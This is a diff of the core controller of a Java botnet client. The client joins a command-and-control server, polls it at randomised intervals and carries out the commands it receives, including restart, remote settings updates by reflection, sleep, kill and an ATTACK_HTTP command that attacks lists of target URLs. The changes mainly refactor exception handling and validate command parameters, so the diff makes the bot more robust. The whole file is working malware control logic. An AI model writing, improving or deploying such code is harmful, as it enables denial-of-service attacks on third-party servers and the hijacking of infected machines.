@@ -31,7 +31,7 @@ import com.acmutv.botnet.config.AppConfigurationService;
 import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.BotCommandService;
-import com.acmutv.botnet.core.exception.BotException;
+import com.acmutv.botnet.core.exception.*;
 import com.acmutv.botnet.core.pool.BotPool;
 import com.acmutv.botnet.core.state.BotState;
 import com.acmutv.botnet.core.target.HttpTarget;
@@ -40,6 +40,7 @@ import com.acmutv.botnet.tool.reflection.ReflectionManager;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.time.Duration;
+import com.acmutv.botnet.tool.time.Interval;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -48,9 +49,9 @@ import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.concurrent.ThreadLocalRandom;
 import java.util.concurrent.TimeUnit;
 
 /**
@@ -81,24 +82,43 @@ public class CoreController {
 
   /**
    * The bot entry-point.
-   * @throws BotException in case of errors during bot life cycle.
+   * @throws BotFatalException when bot's life cycle is interrupted.
    */
-  public static void startBot() throws BotException {
+  public static void startBot() throws BotFatalException {
     changeState(BotState.INIT);
     boolean alive = true;
     while (alive) {
       switch (STATE) {
         case INIT:
-          initializeBot();
+          try {
+            initializeBot();
+          } catch (BotInitializationException exc) {
+            throw new BotFatalException("Cannot initialize bot. %s", exc.getMessage());
+          }
           break;
 
         case JOIN:
-          joinBotnet();
+          try {
+            joinBotnet();
+          } catch (BotInitializationException exc) {
+            throw new BotFatalException("Cannot join botnet. %s", exc.getMessage());
+          }
           break;
 
         case EXECUTION:
-          BotCommand cmd = getNextCommand();
-          executeCommands(cmd);
+          try {
+            BotCommand cmd = getNextCommand();
+            if (cmd.equals(BotCommand.NONE)) {
+              break;
+            }
+            executeCommand(cmd);
+          } catch (BotCommandParsingException exc) {
+            LOGGER.warn("Cannot read command. {}", exc.getMessage());
+          } catch (BotMalformedCommandException exc) {
+            LOGGER.warn("Not valid command read. {}", exc.getMessage());
+          } catch (BotExecutionException exc) {
+            LOGGER.warn("Cannot execute command. {}", exc.getMessage());
+          }
           break;
 
         case DEAD:
@@ -108,74 +128,102 @@ public class CoreController {
         default:
           break;
       }
-    }
 
+      pollingPause();
+    }
+  }
+
+  private static void pollingPause() {
+    final Interval pollingPeriod = AppConfigurationService.getConfigurations().getPolling();
+    final long pollingPauseAmount =
+        ThreadLocalRandom.current().nextLong(pollingPeriod.getMin(), pollingPeriod.getMax());
+    try {
+      pollingPeriod.getUnit().sleep(pollingPauseAmount);
+    } catch (InterruptedException exc) {
+      return;
+    }
   }
 
   /**
    * Executes the state `INIT`.
    * Initializes the bot, giving it an identity.
-   * @throws  BotException when errors during initialization.
+   * @throws  BotInitializationException when errors during initialization.
    */
-  public static void initializeBot() throws BotException {
-    LOGGER.traceEntry();
-    LOGGER.info("Initializing bot...");
-    generateId();
-    LOGGER.info("Bot correctly initialized with ID={}", ID);
+  public static void initializeBot() throws BotInitializationException {
+    LOGGER.traceEntry("Initializing bot...");
+    try {
+      generateId();
+    } catch (SocketException | UnknownHostException exc) {
+      throw new BotInitializationException("Cannot generated bot ID. %s", exc.getMessage());
+    }
+    LOGGER.info("Bot initialized with ID={}", ID);
     changeState(BotState.JOIN);
-    LOGGER.traceExit();
   }
 
   /**
    * Executes the state `JOIN`.
    * Establishes a connection with the CC and make the bot join the botnet.
-   * @throws  BotException when errors during botnet joining.
+   * @throws  BotInitializationException when errors during botnet joining.
    */
-  public static void joinBotnet() throws BotException {
-    LOGGER.traceEntry();
+  public static void joinBotnet() throws BotInitializationException {
+    LOGGER.traceEntry("Joining botnet...");
     final String initResource = AppConfigurationService.getConfigurations().getInitResource();
     LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
     try {
       AppConfigurationService.loadJsonResource(initResource);
     } catch (IOException exc) {
-      throw new BotException("Cannot load bot configuration C&C. Cause: {}", exc.getMessage());
+      throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
     }
+    LOGGER.trace("Botnet joined");
     allocateResources();
-    LOGGER.info("Bot is up and running");
     changeState(BotState.EXECUTION);
-    LOGGER.traceExit();
+    LOGGER.info("Bot is up and running");
   }
 
   /**
    * Executes a command.
-   * @param command the command to execute.
-   * @throws  BotException when errors during command execution.
+   * @param cmd the command to execute.
+   * @throws BotMalformedCommandException when command parameters are malformed.
+   * @throws BotExecutionException when command cannot be correctly executed.
    */
-  public static void executeCommands(final BotCommand command) throws BotException {
-    LOGGER.traceEntry("command={}", command);
-    LOGGER.info("Received command {} with params={}", command.getScope(), command.getParams());
+  public static void executeCommand(final BotCommand cmd)
+      throws BotMalformedCommandException, BotExecutionException {
+    LOGGER.traceEntry("cmd={}", cmd);
+    LOGGER.info("Received command {} with params={}", cmd.getScope(), cmd.getParams());
 
-    switch (command.getScope()) {
+    switch (cmd.getScope()) {
 
       case RESTART:
-        final String resource = (String) command.getParams().get("resource");
-        restartBot((resource != null) ? resource : AppConfigurationService.getConfigurations().getInitResource());
+        final String resource = (String) cmd.getParams().get("resource");
+        if (resource == null || resource.isEmpty()) {
+          throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
+        }
+        restartBot(resource);
         break;
 
       case UPDATE:
         @SuppressWarnings("unchecked")
-        final Map<String,String> settings = (Map<String,String>) command.getParams().get("settings");
-        updateBot((settings != null) ? settings : new HashMap<>());
+        final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
+        if (settings == null) {
+          throw new BotMalformedCommandException("Cannot execute command UPDATE: param [settings] is null");
+        }
+        updateBot(settings);
         break;
 
       case SLEEP:
-        final Duration sleepTimeout = (Duration) command.getParams().get("timeout");
-        sleep((sleepTimeout != null) ? sleepTimeout : new Duration(60, TimeUnit.SECONDS));
+        final Duration sleepTimeout = (Duration) cmd.getParams().get("timeout");
+        if (sleepTimeout == null) {
+          throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
+        }
+        sleep(sleepTimeout);
         break;
 
       case SHUTDOWN:
-        final Duration shutdownTimeout = (Duration) command.getParams().get("timeout");
-        shutdown((shutdownTimeout != null) ? shutdownTimeout : new Duration(60, TimeUnit.SECONDS));
+        final Duration shutdownTimeout = (Duration) cmd.getParams().get("timeout");
+        if (shutdownTimeout == null) {
+          throw new BotMalformedCommandException("Cannot execute command SHUTDOWN: param [timeout] is null");
+        }
+        shutdown(shutdownTimeout);
         break;
 
       case KILL:
@@ -183,9 +231,21 @@ public class CoreController {
         break;
 
       case ATTACK_HTTP:
-        final HttpMethod method = (HttpMethod) command.getParams().get("method");
+        final HttpMethod method = (HttpMethod) cmd.getParams().get("method");
         @SuppressWarnings("unchecked")
-        final List<HttpTarget> targets = (List<HttpTarget>) command.getParams().get("targets");
+        final List<HttpTarget> targets = (List<HttpTarget>) cmd.getParams().get("targets");
+        if (method == null) {
+          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [method] is null");
+        }
+        if (targets == null) {
+          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets] is null");
+        } else {
+          for (HttpTarget target : targets) {
+            if (target.getUrl() == null) {
+              throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets.target.url] is null");
+            }
+          }
+        }
         executeHttpAttack(method, targets);
         break;
 
@@ -195,39 +255,32 @@ public class CoreController {
     LOGGER.traceExit();
   }
 
-
-
   /**
-   * Generates the bot ID [MAC_ADDRESS]-[PID].
-   * @throws BotException when bot ID cannot be generated.
+   * Generates the bot ID [MAC_ADDRESS]-[JVM-NAME].
+   * @throws SocketException when MAC cannot be read.
+   * @throws UnknownHostException when MAC cannot be read.
    */
-  private static void generateId() throws BotException {
-    LOGGER.traceEntry();
-    final String mac;
-    try {
-      mac = ConnectionManager.getMAC();
-    } catch (UnknownHostException|SocketException exc) {
-      throw new BotException("Bot ID cannot be generated. Cause : %s", exc.getMessage());
-    }
-    final String pid = RuntimeManager.getJvmName();
-    ID = String.format("%s-%s", mac, pid);
-    LOGGER.traceExit();
+  private static void generateId() throws SocketException, UnknownHostException {
+    LOGGER.traceEntry("Generating ID...");
+    final String mac = ConnectionManager.getMAC();
+    final String jvmName = RuntimeManager.getJvmName();
+    ID = String.format("%s-%s", mac, jvmName);
+    LOGGER.trace("ID generated: {}", ID);
   }
 
   /**
    * Parses a {@link BotCommand} from the resource specified in {@link AppConfiguration}.
    * @return the parsed command; command with scope NONE, in case of error.
-   * @throws BotException when command resource is unreachable.
+   * @throws BotCommandParsingException when command resource is unreachable.
    */
-  private static BotCommand getNextCommand() throws BotException {
-    LOGGER.traceEntry();
+  private static BotCommand getNextCommand() throws BotCommandParsingException {
     final String cmdResource = AppConfigurationService.getConfigurations().getCmdResource();
-    LOGGER.info("Reading command from {}", cmdResource);
+    LOGGER.trace("Consuming command from C&C at {}...", cmdResource);
     BotCommand cmd;
     try {
       cmd = BotCommandService.consumeJsonResource(cmdResource);
     } catch (IOException exc) {
-      throw new BotException("Cannot consume command. Cause: " + exc.getMessage());
+      throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
     }
     return LOGGER.traceExit(cmd);
   }
@@ -235,14 +288,15 @@ public class CoreController {
   /**
    * Executes the bot command `RESTART`.
    * @param resource the path to the CC initialization resource.
+   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
-  private static void restartBot(String resource) throws BotException {
+  private static void restartBot(String resource) throws BotExecutionException {
     LOGGER.traceEntry("resource={}", resource);
     LOGGER.info("Restarting bot with resource {}...", resource);
     try {
       AppConfigurationService.loadJsonResource(resource);
     } catch (IOException exc) {
-      throw new BotException("Cannot restart bot. Initialization resource cannot be read. Cause: %s", exc.getMessage());
+      throw new BotExecutionException("Cannot restart bot. Initialization resource cannot be read. %s", exc.getMessage());
     }
     LOGGER.traceExit();
   }
@@ -250,9 +304,9 @@ public class CoreController {
   /**
    * Executes the command `UPDATE`.
    * @param settings the settings to load.
-   * @throws BotException when malformed settings.
+   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
-  private static void updateBot(Map<String,String> settings) throws BotException {
+  private static void updateBot(Map<String,String> settings) throws BotExecutionException {
     LOGGER.traceEntry("settings={}", settings);
     LOGGER.info("Updating bot settings ...");
     for (Map.Entry<String,String> property : settings.entrySet()) {
@@ -262,7 +316,7 @@ public class CoreController {
         ReflectionManager.set(AppConfiguration.class,
             AppConfigurationService.getConfigurations(), k, v);
       } catch (IntrospectionException | InvocationTargetException | IllegalAccessException exc) {
-        throw new BotException("Aborting settings update. Cannot set property %s to value %s", k, v);
+        throw new BotExecutionException("Cannot update bot. Invalid settings found (%s to value %s).", k, v);
       }
     }
     LOGGER.info("Bot settings updated");
@@ -272,8 +326,9 @@ public class CoreController {
   /**
    * Executes the command `SLEEP`.
    * @param timeout the time period to sleep.
+   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
    */
-  private static void sleep(Duration timeout) {
+  private static void sleep(Duration timeout) throws BotExecutionException {
     LOGGER.traceEntry("timeout={}", timeout);
     LOGGER.info("Sleeping (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
     changeState(BotState.SLEEP);
@@ -281,7 +336,7 @@ public class CoreController {
     try {
       timeout.getUnit().sleep(timeout.getAmount());
     } catch (InterruptedException exc) {
-      LOGGER.trace(exc.getMessage());
+      throw new BotExecutionException("Cannot complete sleeping. %s", exc.getMessage());
     }
     LOGGER.info("Awake");
     changeState(BotState.EXECUTION);
@@ -308,12 +363,10 @@ public class CoreController {
    * All resources are released, immediately.
    */
   private static void kill() {
-    LOGGER.traceEntry();
     LOGGER.info("Killing the bot...");
     freeResources(null);
     LOGGER.info("Bot killed");
     changeState(BotState.DEAD);
-    LOGGER.traceExit();
   }
 
   public static void executeHttpAttack(HttpMethod method, List<HttpTarget> targets) {
@@ -331,9 +384,10 @@ public class CoreController {
    * Allocates bot's resources.
    */
   private static void allocateResources() {
-    LOGGER.traceEntry("Allocating resources...");
+    LOGGER.trace("Allocating resources...");
     POOL = new BotPool();
-    LOGGER.traceExit("Resources allocated");
+    //TODO
+    LOGGER.trace("Resources allocated");
   }
 
   /**
